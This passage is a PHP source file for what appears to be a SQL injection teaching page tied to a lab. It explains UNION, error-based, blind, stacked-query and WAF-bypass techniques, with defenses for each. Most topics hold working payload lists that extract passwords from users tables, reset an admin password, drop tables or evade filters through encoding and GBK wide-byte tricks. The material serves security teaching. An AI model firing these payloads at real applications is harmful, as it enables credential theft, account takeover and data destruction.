<?php
session_start();
require_once __DIR__ . '/../includes/config.php';
require_once __DIR__ . '/../includes/header.php';

$topics = [
    'union-based' => [
        'name'       => 'UNION-Based Injection',
        'icon'       => 'U',
        'categories' => ['UNION-Based'],
        'severity'   => 'high',
        'prereqs'    => 'Basic SQL SELECT syntax, understanding of result sets and column types.',

        'summary' => 'UNION-based injection appends an attacker-controlled SELECT to the original query, merging both result sets into one response. It is the fastest extraction technique because it returns data directly in the page output: no guessing, no timing, no errors needed.',

        'how' => '<p>Every SQL <code>UNION</code> operation combines two SELECT statements into a single result set. For this to work, both SELECTs must have the <strong>same number of columns</strong> and the columns must have <strong>compatible data types</strong>.</p>
<p>The attacker first terminates the original query\'s string context (by injecting a quote or escaping the context), then appends <code>UNION SELECT</code> with their own column values. The injected row appears in the application\'s normal output alongside legitimate data.</p>
<p>The key challenge is <strong>column count discovery</strong>. The attacker doesn\'t know how many columns the original query returns. Two methods exist:</p>
<ul>
<li><strong>ORDER BY method:</strong> Increment <code>ORDER BY N</code> until an error occurs. If <code>ORDER BY 3</code> works but <code>ORDER BY 4</code> fails, the query has 3 columns.</li>
<li><strong>NULL method:</strong> Try <code>UNION SELECT NULL</code>, <code>UNION SELECT NULL,NULL</code>, etc. until no error occurs. NULLs are compatible with any data type.</li>
</ul>
<p>Once the column count is known, the attacker identifies which columns are <strong>reflected in the output</strong> (some columns may not be displayed). They then replace those positions with subqueries to extract data from any accessible table.</p>',

        'indicators' => [
            'The application displays database query results directly (tables, lists, profile data)',
            'Error messages appear when injecting a single quote or double quote',
            'Different numbers of NULL values in UNION produce different responses',
            'Database-specific errors mention column count mismatches',
        ],

        'steps' => [
            '<strong>Find the injection point</strong>: Enter a single quote <code>\'</code> or double quote <code>"</code>. An error confirms the input is concatenated into SQL.',
            '<strong>Determine column count</strong>: Use <code>\' ORDER BY 1-- -</code>, <code>\' ORDER BY 2-- -</code>, etc. The last number that doesn\'t error is the column count.',
            '<strong>Identify reflected columns</strong>: <code>\' UNION SELECT \'a\',\'b\',\'c\'-- -</code> and check which values appear in the page.',
            '<strong>Enumerate the database</strong>: Query the schema catalog to find table and column names.',
            '<strong>Extract target data</strong>: Replace reflected positions with subqueries: <code>\' UNION SELECT password, NULL, NULL FROM users-- -</code>',
        ],

        'payloads' => [
            ['label' => 'Column count (ORDER BY)', 'code' => "' ORDER BY 3-- -"],
            ['label' => 'Column count (NULL)', 'code' => "' UNION SELECT NULL,NULL,NULL-- -"],
            ['label' => 'Find reflected columns', 'code' => "' UNION SELECT 'col1','col2','col3'-- -"],
            ['label' => 'MySQL: list all tables', 'code' => "' UNION SELECT table_name,NULL,NULL FROM information_schema.tables WHERE table_schema=database()-- -"],
            ['label' => 'MySQL: list columns', 'code' => "' UNION SELECT column_name,NULL,NULL FROM information_schema.columns WHERE table_name='users'-- -"],
            ['label' => 'PostgreSQL: list tables', 'code' => "' UNION SELECT table_name,NULL,NULL FROM information_schema.tables WHERE table_schema='public'--"],
            ['label' => 'SQLite: list tables', 'code' => "' UNION SELECT name,sql,NULL FROM sqlite_master WHERE type='table'-- -"],
            ['label' => 'Oracle: list tables', 'code' => "' UNION SELECT table_name,NULL,NULL FROM all_tables WHERE owner='SCHEMA_NAME'--"],
            ['label' => 'MSSQL: list tables', 'code' => "' UNION SELECT table_name,NULL,NULL FROM information_schema.tables-- -"],
            ['label' => 'Extract data', 'code' => "' UNION SELECT username,password,email FROM users WHERE username='admin'-- -"],
        ],

        'techniques' => [
            'MySQL'      => 'Standard UNION SELECT. Use <code>information_schema.tables</code> and <code>information_schema.columns</code> for schema enumeration. <code>GROUP_CONCAT()</code> to combine multiple rows into one field. String columns accept any type. Comments: <code>-- -</code> or <code>#</code>.',
            'PostgreSQL' => 'Strict type matching: column types must be compatible. Use <code>::text</code> casts. String concat with <code>||</code>. Dollar-quoting <code>$$string$$</code> bypasses quote filters. Comments: <code>--</code>.',
            'SQLite'     => 'No type enforcement (dynamically typed). Schema in <code>sqlite_master</code> table. <code>sql</code> column reveals CREATE TABLE DDL. No <code>information_schema</code>. Comments: <code>-- </code> (note trailing space).',
            'MSSQL'      => 'Strict type matching. <code>information_schema.tables</code> works. Also <code>sysobjects</code> and <code>syscolumns</code>. <code>+</code> for string concat. Comments: <code>--</code> or <code>/* */</code>.',
            'Oracle'     => 'Every SELECT must have <code>FROM</code>. Use <code>FROM DUAL</code> for dummy queries. Schema via <code>all_tables</code>, <code>all_tab_columns</code>. <code>||</code> for concat. No <code>LIMIT</code>: use <code>WHERE ROWNUM &lt;= N</code>.',
            'MariaDB'    => 'MySQL-compatible syntax. Same <code>information_schema</code> approach. Additional features like CONNECT engine and sequences.',
        ],

        'mistakes' => [
            'Forgetting to close the string context: the injected UNION appears <em>inside</em> a string literal',
            'Wrong column count. UNION with mismatched columns always fails',
            'Type mismatch in PostgreSQL/MSSQL: use NULL or explicit casts',
            'Not commenting out the remainder of the original query: trailing SQL causes syntax errors',
            'Oracle: forgetting FROM DUAL in the injected SELECT',
            'Using <code>UNION</code> instead of <code>UNION ALL</code>. UNION removes duplicates, which can hide results if the injected value matches an existing row',
        ],

        'real_world' => 'UNION injection is the most common initial technique in real-world SQL injection attacks. It was used in the 2008 Heartland Payment Systems breach (130 million credit cards), the 2011 Sony PlayStation Network hack, and countless web application compromises. Tools like sqlmap automate UNION injection with column-count detection, type inference, and data extraction.',

        'databases'  => ['MySQL', 'PostgreSQL', 'SQLite', 'MSSQL', 'Oracle', 'MariaDB'],
        'defense'    => '<strong>Parameterized queries (prepared statements)</strong> are the only reliable fix. Never concatenate user input into SQL strings. ORMs with parameterized queries also work. Input validation and WAFs provide defense-in-depth but can be bypassed.',
    ],

    'error-based' => [
        'name'       => 'Error-Based Injection',
        'icon'       => 'E',
        'categories' => ['Error-Based'],
        'severity'   => 'high',
        'prereqs'    => 'Understanding of SQL data types, type casting, and XML functions. Familiarity with database-specific function syntax.',

        'summary' => 'Error-based injection forces the database to throw an error message that contains extracted data embedded within it. Unlike UNION injection, error-based techniques work even when the application only displays error messages but not query results.',

        'how' => '<p>When an application shows database error messages to the user (even partially), an attacker can craft SQL expressions that <strong>deliberately cause errors</strong> where the error text includes the result of a subquery.</p>
<p>The core idea: wrap a data-extracting subquery inside a function that will fail and include the subquery\'s result in the failure message. Each DBMS has different functions that behave this way:</p>
<ul>
<li><strong>Type casting errors:</strong> <code>CAST(\'abc\' AS INT)</code> fails with "cannot convert \'abc\'": if \'abc\' is replaced with a subquery result, the data leaks in the error.</li>
<li><strong>XPath errors:</strong> MySQL\'s <code>EXTRACTVALUE()</code> and <code>UPDATEXML()</code> throw errors containing the XPath expression value when it\'s invalid.</li>
<li><strong>Math overflow:</strong> MySQL\'s <code>EXP()</code> overflows on large values: if the value is derived from a subquery, the data leaks.</li>
<li><strong>Duplicate key:</strong> MySQL\'s <code>FLOOR(RAND()*2)</code> in a GROUP BY causes a duplicate entry error that includes the grouped value.</li>
</ul>
<p>Error-based injection typically extracts <strong>one piece of data per request</strong>, but each request returns data immediately (no character-by-character guessing). Error messages may have length limits (usually ~100-200 chars), so long values must be extracted in chunks using <code>SUBSTRING()</code>.</p>',

        'indicators' => [
            'Database error messages are displayed in the application response',
            'Errors reveal the DBMS type (MySQL, PostgreSQL, Oracle, etc.)',
            'Injecting a type mismatch (e.g., converting a string to integer) shows the string value in the error',
            'Application returns HTTP 500 with detailed error information',
        ],

        'steps' => [
            '<strong>Confirm errors are visible</strong>: Inject a single quote. If the error message contains SQL syntax details, error-based injection is possible.',
            '<strong>Identify the DBMS</strong>: Error message format reveals the database: "MySQL", "PG::", "ORA-", "Msg " (MSSQL).',
            '<strong>Choose the right error vector</strong>: Use the appropriate function for the target DBMS (see techniques below).',
            '<strong>Wrap your target subquery</strong>: Place <code>(SELECT column FROM table LIMIT 1)</code> inside the error function.',
            '<strong>Handle length limits</strong>: If data is truncated, use <code>SUBSTRING(result, start, length)</code> to extract in chunks.',
        ],

        'payloads' => [
            ['label' => 'MySQL: EXTRACTVALUE', 'code' => "' AND EXTRACTVALUE(1, CONCAT(0x7e, (SELECT password FROM users LIMIT 1)))-- -"],
            ['label' => 'MySQL: UPDATEXML', 'code' => "' AND UPDATEXML(1, CONCAT(0x7e, (SELECT password FROM users LIMIT 1)), 1)-- -"],
            ['label' => 'MySQL: FLOOR + GROUP BY', 'code' => "' AND (SELECT 1 FROM (SELECT COUNT(*),CONCAT((SELECT password FROM users LIMIT 1),FLOOR(RAND(0)*2))x FROM information_schema.tables GROUP BY x)a)-- -"],
            ['label' => 'MySQL: EXP overflow', 'code' => "' AND EXP(~(SELECT * FROM (SELECT password FROM users LIMIT 1)x))-- -"],
            ['label' => 'MySQL: GTID_SUBSET', 'code' => "' AND GTID_SUBSET(CONCAT(0x7e,(SELECT password FROM users LIMIT 1)),1)-- -"],
            ['label' => 'PostgreSQL: CAST', 'code' => "' AND 1=CAST((SELECT password FROM users LIMIT 1) AS INT)--"],
            ['label' => 'MSSQL: CONVERT', 'code' => "' AND 1=CONVERT(INT,(SELECT TOP 1 password FROM users))--"],
            ['label' => 'Oracle: XMLType', 'code' => "' AND 1=EXTRACTVALUE(XMLType('<a>'||(SELECT password FROM users WHERE ROWNUM<=1)||'</a>'),'/a')--"],
            ['label' => 'Oracle: UTL_INADDR', 'code' => "' AND 1=UTL_INADDR.GET_HOST_ADDRESS((SELECT password FROM users WHERE ROWNUM<=1))--"],
        ],

        'techniques' => [
            'MySQL'      => '<code>EXTRACTVALUE(1, CONCAT(0x7e, subquery))</code>: most reliable, ~32 char limit. <code>UPDATEXML(1, CONCAT(0x7e, subquery), 1)</code>: similar. <code>FLOOR(RAND(0)*2) + GROUP BY</code>: classic double-query. <code>EXP(~(subquery))</code>: BIGINT overflow. <code>GTID_SUBSET()</code>: MySQL 5.7+, longer output.',
            'PostgreSQL' => '<code>CAST(subquery AS INT)</code> or <code>subquery::int</code>: type conversion error leaks the string value. Very reliable and simple. Also <code>query_to_xml()</code> for XML-based errors.',
            'MSSQL'      => '<code>CONVERT(INT, subquery)</code>: type conversion. <code>1 IN (SELECT subquery)</code>: forces comparison error. <code>FOR XML PATH</code> can concatenate multiple rows into one error.',
            'Oracle'     => '<code>XMLType()</code> and <code>EXTRACTVALUE()</code>: XML parse errors. <code>UTL_INADDR.GET_HOST_ADDRESS()</code>: DNS resolution error. <code>CTXSYS.DRITHSX.SN()</code>: Oracle Text error.',
            'MariaDB'    => 'Same as MySQL (EXTRACTVALUE, UPDATEXML, FLOOR). Also <code>SIGNAL SQLSTATE</code> for custom error messages in stored procedures. <code>GET DIAGNOSTICS</code> for info leakage.',
        ],

        'mistakes' => [
            'Using EXTRACTVALUE when the result contains special XML characters (<, >, &): they get escaped or truncated',
            'Not using 0x7e (~) prefix: without it, the extracted value may blend with the error message and be hard to identify',
            'Exceeding the error message length limit: use SUBSTRING() for long values',
            'FLOOR+RAND technique requires a table with enough rows to trigger the duplicate key: may not work on empty tables',
            'Assuming all errors are displayed: some frameworks catch and hide specific error types',
        ],

        'real_world' => 'Error-based injection is extremely common in legacy applications that display verbose error messages. Modern frameworks typically suppress detailed errors in production, but misconfigured applications still expose them. This technique is preferred when the application doesn\'t display query results (no UNION possible) but does show errors. sqlmap\'s --technique=E flag automates error-based extraction.',

        'defense' => '<strong>Never expose database errors to users.</strong> Use generic error pages in production (HTTP 500 with "An error occurred"). Log detailed errors server-side only. Custom error handlers should catch all database exceptions. Still use parameterized queries as the primary defense.',
    ],

    'blind-injection' => [
        'name'       => 'Blind Injection',
        'icon'       => 'B',
        'categories' => ['Blind Injection'],
        'severity'   => 'high',
        'prereqs'    => 'Understanding of conditional SQL expressions (IF, CASE WHEN), ASCII character codes, and binary search algorithm.',

        'summary' => 'Blind injection extracts data when the application shows no query results and no error messages. The attacker infers data one bit at a time by observing either a difference in page content (boolean-based) or a difference in response time (time-based). It is the slowest but most universal technique.',

        'how' => '<p>Blind injection works in two variants:</p>
<h5 style="color:var(--neon2);margin:12px 0 6px;">Boolean-Based Blind</h5>
<p>The application behaves differently based on whether a SQL condition is true or false. This difference can be:</p>
<ul>
<li>Different page content ("Member found" vs "Member not found")</li>
<li>Different HTTP status code (200 vs 302 vs 500)</li>
<li>Different response length</li>
<li>Presence or absence of a specific HTML element</li>
</ul>
<p>The attacker injects a conditional expression: <code>AND SUBSTRING(password,1,1)=\'a\'</code>. If the page shows the "true" response, the first character is \'a\'. If not, try \'b\', \'c\', etc. <strong>Binary search with ASCII codes</strong> reduces this to ~7 requests per character instead of up to 95.</p>

<h5 style="color:var(--neon2);margin:12px 0 6px;">Time-Based Blind</h5>
<p>When the application shows the <strong>exact same response</strong> regardless of query result (no boolean signal at all), the attacker uses <strong>response timing</strong> as the only oracle. A conditional <code>SLEEP()</code> or equivalent delay function creates a measurable difference:</p>
<ul>
<li>If condition is true: response takes ~3 seconds (SLEEP triggered)</li>
<li>If condition is false: response is instant (~50ms)</li>
</ul>
<p>Time-based blind is the <strong>slowest extraction method</strong> because each request must wait for the delay, and the delay must be long enough to distinguish from normal network latency.</p>

<h5 style="color:var(--neon2);margin:12px 0 6px;">Binary Search Optimization</h5>
<p>Instead of testing every character (a-z, 0-9, symbols = ~95 possibilities), use <code>ASCII(SUBSTRING(...))</code> and binary search. Test if the ASCII value is <code>&gt; 64</code>, then <code>&gt; 96</code> or <code>&gt; 48</code>, etc. This finds any character in exactly <strong>7 requests</strong> (log2(128) = 7). For a 26-character flag, that\'s 182 requests instead of potentially 2,470.</p>',

        'indicators' => [
            'The application shows different content for valid vs invalid inputs (boolean oracle)',
            'The application shows identical content for all inputs but timing differs (time oracle)',
            'No error messages are displayed, and no query data is returned',
            'Injecting <code>AND 1=1</code> vs <code>AND 1=2</code> produces different responses (boolean)',
            'Injecting <code>OR SLEEP(2)</code> causes a noticeable delay (time)',
        ],

        'steps' => [
            '<strong>Identify the oracle type</strong>: Test <code>\' AND 1=1-- -</code> vs <code>\' AND 1=2-- -</code>. Different responses = boolean blind. Same response = try time-based.',
            '<strong>Confirm time oracle (if boolean fails)</strong>: Test <code>\' OR SLEEP(2)-- -</code>. If the response takes 2+ seconds, time-based blind is possible.',
            '<strong>Find the data length</strong>: <code>\' AND LENGTH((SELECT password FROM users LIMIT 1))=N-- -</code>. Binary search for the length.',
            '<strong>Extract character by character</strong>: <code>\' AND ASCII(SUBSTRING((SELECT password FROM users LIMIT 1),1,1))>64-- -</code>. Binary search for each position.',
            '<strong>Automate</strong>: Manual extraction is tedious (hundreds of requests). Write a script or use sqlmap.',
        ],

        'payloads' => [
            ['label' => 'Boolean: confirm oracle', 'code' => "admin' AND 1=1-- -  (TRUE)\nadmin' AND 1=2-- -  (FALSE)"],
            ['label' => 'Boolean: extract length', 'code' => "admin' AND LENGTH((SELECT password FROM users LIMIT 1))>20-- -"],
            ['label' => 'Boolean: extract character', 'code' => "admin' AND ASCII(SUBSTRING((SELECT password FROM users LIMIT 1),1,1))>70-- -"],
            ['label' => 'Boolean: exact match', 'code' => "admin' AND ASCII(SUBSTRING((SELECT password FROM users LIMIT 1),1,1))=70-- -"],
            ['label' => 'Time: confirm SLEEP', 'code' => "' OR SLEEP(2)-- -"],
            ['label' => 'Time: conditional', 'code' => "' OR IF(1=1, SLEEP(2), 0)-- -"],
            ['label' => 'Time: extract character', 'code' => "' OR IF(ASCII(SUBSTRING((SELECT password FROM users LIMIT 1),1,1))>70, SLEEP(2), 0)-- -"],
            ['label' => 'PostgreSQL boolean', 'code' => "' AND (SELECT CASE WHEN SUBSTRING(password,1,1)='a' THEN true ELSE false END FROM users LIMIT 1)--"],
            ['label' => 'PostgreSQL time', 'code' => "'; SELECT CASE WHEN SUBSTRING(password,1,1)='a' THEN pg_sleep(3) ELSE pg_sleep(0) END FROM users--"],
            ['label' => 'MSSQL time', 'code' => "'; IF (ASCII(SUBSTRING((SELECT TOP 1 password FROM users),1,1))>70) WAITFOR DELAY '0:0:3'--"],
            ['label' => 'SQLite heavy query (no SLEEP)', 'code' => "' AND CASE WHEN SUBSTR((SELECT flag FROM secrets),1,1)='F' THEN RANDOMBLOB(300000000) ELSE 0 END-- -"],
        ],

        'techniques' => [
            'MySQL'      => '<strong>Boolean:</strong> <code>IF(condition, true, false)</code>, <code>SUBSTRING()</code>, <code>ASCII()</code>, <code>REGEXP</code>, <code>LIKE</code>. <strong>Time:</strong> <code>SLEEP(N)</code>: fires per row; use <code>IF(cond, SLEEP(N), 0)</code>. Heavy query alternative: <code>BENCHMARK(10000000, SHA1(1))</code>.',
            'PostgreSQL' => '<strong>Boolean:</strong> <code>CASE WHEN cond THEN true ELSE false END</code>. <strong>Time:</strong> <code>pg_sleep(N)</code>. Also conditional error: <code>CASE WHEN cond THEN 1/0 ELSE 1 END</code> for error-blind hybrid.',
            'MSSQL'      => '<strong>Boolean:</strong> <code>CASE WHEN cond THEN 1 ELSE 0 END</code>, <code>SUBSTRING()</code>, <code>ASCII()</code>. <strong>Time:</strong> <code>WAITFOR DELAY \'0:0:5\'</code> inside <code>IF</code> statement. Stacked queries make time-based very reliable.',
            'Oracle'     => '<strong>Boolean:</strong> <code>CASE WHEN cond THEN 1 ELSE 1/0 END</code> (error as boolean). <strong>Time:</strong> <code>DBMS_PIPE.RECEIVE_MESSAGE(\'x\',5)</code>: waits 5 seconds. Heavy query: <code>UTL_HTTP.REQUEST</code> to slow endpoint.',
            'SQLite'     => '<strong>Boolean:</strong> <code>CASE WHEN SUBSTR(data,pos,1)=\'c\' THEN 1 ELSE 0 END</code>. <strong>Time:</strong> No native SLEEP. Use <code>RANDOMBLOB(N)</code> or <code>LIKE(\'%..%\', ZEROBLOB(N))</code> for CPU-heavy computation. <code>hex(substr())</code> is more reliable than direct char comparison.',
        ],

        'mistakes' => [
            'Not accounting for MySQL\'s case-insensitive string comparison (default collation): use ASCII() instead of direct char comparison',
            'Setting SLEEP too short: network latency can cause false positives. Use 2-3 seconds minimum.',
            'Setting SLEEP too long: extraction of 30 chars * 7 queries * 3 seconds = 10+ minutes per value',
            'Forgetting that MySQL SLEEP fires per row: <code>OR SLEEP(2)</code> on a 10-row table causes 20 seconds delay',
            'Not using binary search: linear character testing is 14x slower',
            'Testing against a noisy network: time-based blind needs a stable connection',
        ],

        'real_world' => 'Blind injection is the most commonly successful technique in modern applications because developers often suppress error messages (killing error-based) and don\'t display query results directly (killing UNION). sqlmap automates blind injection with --technique=B (boolean) or --technique=T (time). A 32-character password can be extracted in ~224 boolean requests or ~224 timed requests (3-5 minutes with a script).',

        'defense' => '<strong>Parameterized queries</strong> prevent all blind injection. Additional mitigations: <strong>rate limiting</strong> slows extraction (but doesn\'t prevent it), <strong>query timeouts</strong> can limit SLEEP abuse, and <strong>WAFs</strong> can detect SLEEP/BENCHMARK patterns. None of these are substitutes for parameterized queries.',
    ],

    'advanced' => [
        'name'       => 'Advanced Techniques',
        'icon'       => 'A',
        'categories' => ['Advanced', 'Injection Vectors'],
        'severity'   => 'critical',
        'prereqs'    => 'Solid understanding of basic SQL injection types (UNION, error, blind). Familiarity with HTTP request structure (headers, cookies).',

        'summary' => 'Advanced injection goes beyond simple WHERE clause attacks. Stacked queries execute entirely new SQL statements. INSERT/UPDATE injection targets write operations. ORDER BY injection works without UNION. Header and second-order injection exploit non-obvious input vectors.',

        'how' => '<h5 style="color:var(--neon2);margin:12px 0 6px;">Stacked Queries</h5>
<p>When the database connector supports multi-statement execution (using <code>;</code> to separate statements), the attacker can execute <strong>any SQL statement</strong>: not just SELECT. This enables INSERT, UPDATE, DELETE, DROP, CREATE, and even administrative commands. Stacked queries are the gateway to <strong>RCE</strong> and <strong>privilege escalation</strong>.</p>
<p>Support varies by DBMS and driver: PostgreSQL and MSSQL support stacked queries natively. MySQL supports them via <code>mysqli_multi_query()</code> but not <code>mysqli_query()</code>. SQLite does not support them (each query is executed separately).</p>

<h5 style="color:var(--neon2);margin:12px 0 6px;">INSERT / UPDATE Injection</h5>
<p>When the injection point is inside an <code>INSERT INTO ... VALUES (...)</code> or <code>UPDATE ... SET col=\'..\'</code>, the attacker cannot use UNION directly. Instead they can:</p>
<ul>
<li>Inject additional columns/values to control what gets stored</li>
<li>Use subqueries inside VALUES to extract data into stored fields</li>
<li>In PostgreSQL: use <code>RETURNING</code> clause to see the inserted data</li>
<li>Trigger error-based extraction from within the INSERT/UPDATE</li>
</ul>

<h5 style="color:var(--neon2);margin:12px 0 6px;">ORDER BY Injection</h5>
<p>When user input controls the <code>ORDER BY</code> clause, UNION is not possible (it must come before ORDER BY). The attacker uses conditional expressions: <code>ORDER BY IF(condition, col1, col2)</code>: different sort orders indicate true/false.</p>

<h5 style="color:var(--neon2);margin:12px 0 6px;">Header Injection</h5>
<p>Applications may log HTTP headers (User-Agent, Referer, X-Forwarded-For, Cookie values) into the database. If these values are not parameterized, SQL injection is possible through HTTP headers: invisible in the URL and form fields.</p>

<h5 style="color:var(--neon2);margin:12px 0 6px;">Second-Order Injection</h5>
<p>The payload is <strong>stored safely</strong> via one endpoint (e.g., user registration properly escapes the input on INSERT) but <strong>triggers unsafely</strong> when retrieved and used in another query (e.g., admin panel that uses the stored username in a raw query). This is extremely hard to detect because the injection point and the trigger point are in different parts of the application.</p>',

        'indicators' => [
            'The application performs INSERT or UPDATE operations (registration, profile update, comments)',
            'Sort order is controlled by user input (URL parameter like ?sort=name)',
            'The application logs HTTP headers to a database (visible in admin panels or audit logs)',
            'Data submitted in one form appears differently when viewed in another context',
        ],

        'steps' => [
            '<strong>Identify the SQL context</strong>: Is the injection in SELECT, INSERT, UPDATE, ORDER BY, or a header value?',
            '<strong>For stacked queries</strong>: Terminate the current statement with <code>;</code> then execute your own: <code>\'; DROP TABLE test; --</code>',
            '<strong>For INSERT injection</strong>: Inject into VALUES with a subquery: <code>\', (SELECT password FROM users LIMIT 1))-- -</code>',
            '<strong>For ORDER BY</strong>: Use conditional sorting: <code>IF((SELECT SUBSTRING(password,1,1) FROM users LIMIT 1)=\'a\', id, username)</code>',
            '<strong>For header injection</strong>: Modify User-Agent, Referer, or Cookie headers. Use Burp Suite to intercept and modify.',
            '<strong>For second-order</strong>: Register with a payload like <code>admin\'-- -</code>, then trigger it by visiting the admin panel.',
        ],

        'payloads' => [
            ['label' => 'Stacked: create user', 'code' => "'; INSERT INTO users(username,password) VALUES('hacker','owned')-- -"],
            ['label' => 'Stacked: update admin', 'code' => "'; UPDATE users SET password='hacked' WHERE username='admin'-- -"],
            ['label' => 'INSERT: extract via subquery', 'code' => "', (SELECT password FROM users WHERE username='admin'))-- -"],
            ['label' => 'ORDER BY: boolean extraction', 'code' => "(SELECT IF(SUBSTRING((SELECT password FROM users LIMIT 1),1,1)='F', 1, (SELECT 1 UNION SELECT 2)))"],
            ['label' => 'Header: User-Agent injection', 'code' => "Mozilla/5.0' AND EXTRACTVALUE(1,CONCAT(0x7e,(SELECT password FROM users LIMIT 1)))-- -"],
            ['label' => 'Second-order: registration', 'code' => "admin'-- -   (stored as username, triggers when used in later query)"],
        ],

        'techniques' => [
            'Stacked Queries'   => 'Full multi-statement support in <strong>MSSQL</strong> (always), <strong>PostgreSQL</strong> (always), <strong>MySQL</strong> (only with <code>mysqli_multi_query()</code>). Enables INSERT, UPDATE, DELETE, EXEC, CREATE: anything the DB user can do.',
            'INSERT/UPDATE'     => 'Inject into <code>VALUES()</code> or <code>SET</code> clauses. PostgreSQL\'s <code>RETURNING</code> clause makes data extraction direct. In MySQL, use error-based extraction within the INSERT.',
            'ORDER BY'          => 'Cannot use UNION (it comes before ORDER BY). Use <code>IF()</code>/<code>CASE WHEN</code> conditional expressions. Error-based extraction also works here.',
            'Header Injection'  => 'SQL injection via <code>User-Agent</code>, <code>Cookie</code>, <code>Referer</code>, <code>X-Forwarded-For</code>. Any header stored in the database is a potential vector.',
            'Second-Order'      => 'Payload stored safely (escaped on INSERT), triggers when read and concatenated into a new query without escaping. Very common in admin panels, reporting, and audit log views.',
        ],

        'mistakes' => [
            'Assuming stacked queries always work. MySQL\'s default mysqli_query() does not support them',
            'Not checking the INSERT column order. Injected values must align with the table schema',
            'For second-order: not realizing the payload is stored literally: special chars in the payload are preserved',
            'Forgetting that ORDER BY injection cannot return data directly. Must use conditional or error-based',
        ],

        'real_world' => 'Second-order injection was found in WordPress plugins where usernames were escaped during registration but used unsanitized in admin queries. Header injection via X-Forwarded-For is common in applications that log client IPs. Stacked queries enabled full database takeover in the 2009 Albert Gonzalez credit card theft (170 million cards from Heartland, 7-Eleven, and others).',

        'defense' => '<strong>Parameterized queries everywhere</strong>: not just in user-facing forms, but in admin panels, logging, background jobs, and any code that builds SQL from stored data. For second-order: treat data read from the database with the same suspicion as user input. Never trust stored values in raw SQL.',
    ],

    'waf-bypass' => [
        'name'       => 'WAF Bypass Techniques',
        'icon'       => 'W',
        'categories' => ['WAF Bypass'],
        'severity'   => 'medium',
        'prereqs'    => 'Knowledge of at least one basic injection technique (UNION/error/blind). Understanding of URL encoding and character sets.',

        'summary' => 'Web Application Firewalls (WAFs) and input filters attempt to block SQL injection by detecting dangerous keywords and patterns. WAF bypass techniques use encoding, obfuscation, and charset tricks to deliver payloads that the WAF doesn\'t recognize but the database interprets correctly.',

        'how' => '<p>WAFs work by pattern-matching request parameters against known attack signatures. The fundamental weakness: the WAF and the database interpret the same input differently. If the attacker can find an encoding or syntax that the WAF doesn\'t flag but the database understands, the bypass succeeds.</p>

<h5 style="color:var(--neon2);margin:12px 0 6px;">Common Filter Types</h5>
<ul>
<li><strong>Keyword blacklist:</strong> Blocks UNION, SELECT, FROM, WHERE, etc. Bypass: inline comments <code>UN/**/ION</code>, case mixing <code>uNiOn</code>, double keywords <code>UNUNIONION</code>.</li>
<li><strong>Character blacklist:</strong> Blocks single quotes, spaces, comments. Bypass: use <code>%09</code> (tab) for spaces, <code>%27</code> for quotes, <code>CHR()</code> for characters.</li>
<li><strong>Regex patterns:</strong> Matches patterns like <code>UNION\s+SELECT</code>. Bypass: use <code>UNION%0aSELECT</code> (newline instead of space) or <code>UNION/**/SELECT</code>.</li>
<li><strong>addslashes/magic_quotes:</strong> Escapes quotes with backslashes. Bypass: wide byte injection (GBK charset).</li>
</ul>

<h5 style="color:var(--neon2);margin:12px 0 6px;">Wide Byte (GBK) Injection</h5>
<p>When the application uses <code>addslashes()</code> with a multi-byte charset like GBK, the backslash character <code>\\</code> (0x5C) can be consumed as part of a multi-byte character. Sending <code>0xBF27</code> (where 0xBF5C forms a valid GBK character), <code>addslashes()</code> adds a backslash making it <code>0xBF5C27</code>, but <code>0xBF5C</code> is interpreted as a single GBK character, leaving the <code>0x27</code> (single quote) unescaped.</p>',

        'indicators' => [
            'The application blocks specific keywords but works normally with benign input',
            'Injecting <code>UNION SELECT</code> returns a "blocked" or "forbidden" response',
            'The application uses addslashes() instead of parameterized queries',
            'Error messages suggest a filter is stripping or blocking certain characters',
        ],

        'steps' => [
            '<strong>Identify what is filtered</strong>: Test individual keywords (UNION, SELECT, OR, AND) and characters (\', ", --, #) to find what is blocked.',
            '<strong>Test bypass techniques</strong>: Try inline comments, case mixing, encoding, and whitespace alternatives.',
            '<strong>Check charset</strong>: If addslashes is used, check if the database connection charset is multi-byte (GBK, Shift-JIS).',
            '<strong>Chain techniques</strong>: Combine multiple bypasses: <code>/*!50000UnIoN*/ /*!50000SeLeCt*/</code>.',
            '<strong>Verify with a benign payload first</strong>: Before extracting data, confirm the bypass works with <code>\' OR 1=1-- -</code> equivalent.',
        ],

        'payloads' => [
            ['label' => 'Inline comments', 'code' => "' UN/**/ION SEL/**/ECT 1,2,3-- -"],
            ['label' => 'MySQL conditional comments', 'code' => "' /*!50000UNION*/ /*!50000SELECT*/ 1,2,3-- -"],
            ['label' => 'Case mixing', 'code' => "' uNiOn SeLeCt 1,2,3-- -"],
            ['label' => 'Double keyword (single-pass filter)', 'code' => "' UNUNIONION SELSELECTECT 1,2,3-- -"],
            ['label' => 'Whitespace alternatives', 'code' => "'%09UNION%0aSELECT%0d1,2,3-- -"],
            ['label' => 'No spaces (comments)', 'code' => "'/**/UNION/**/SELECT/**/1,2,3-- -"],
            ['label' => 'URL encoding', 'code' => "%27%20UNION%20SELECT%201%2c2%2c3-- -"],
            ['label' => 'GBK wide byte', 'code' => "%bf%27 OR 1=1-- -"],
            ['label' => 'Hex encoding (MySQL)', 'code' => "' UNION SELECT 0x61646D696E-- -  (\"admin\" in hex)"],
            ['label' => 'CHAR() function', 'code' => "' UNION SELECT CHAR(97,100,109,105,110)-- -  (\"admin\" via CHAR)"],
        ],

        'techniques' => [
            'Inline Comments'    => '<code>UN/**/ION SEL/**/ECT</code>: breaks keyword pattern matching. <code>/*!50000UNION SELECT*/</code>: MySQL conditional comments (execute if version >= 5.00.00).',
            'Case Mixing'        => '<code>uNiOn SeLeCt</code>: SQL keywords are case-insensitive but some WAF regex patterns are case-sensitive.',
            'Double Keywords'    => '<code>UNUNIONION SELSELECTECT</code>: if the WAF does a single-pass str_replace removing "UNION" and "SELECT", the remaining characters form the keywords.',
            'Encoding'           => 'URL encoding: <code>%55NION</code>. Double encoding: <code>%2527</code> (decodes to <code>%27</code> then to <code>\'</code>). Hex: <code>0x</code> prefix. Unicode: <code>%u0053ELECT</code> (IIS normalization).',
            'Whitespace'         => 'Replace spaces with <code>%09</code> (tab), <code>%0a</code> (newline), <code>%0b</code> (vertical tab), <code>%0c</code> (form feed), <code>%0d</code> (carriage return), or <code>/**/</code>.',
            'Wide Byte (GBK)'    => '<code>%bf%27</code>: addslashes adds <code>\\</code> (0x5C), creating <code>%bf%5c%27</code>. GBK interprets <code>%bf%5c</code> as one character, leaving <code>%27</code> (single quote) unescaped.',
        ],

        'mistakes' => [
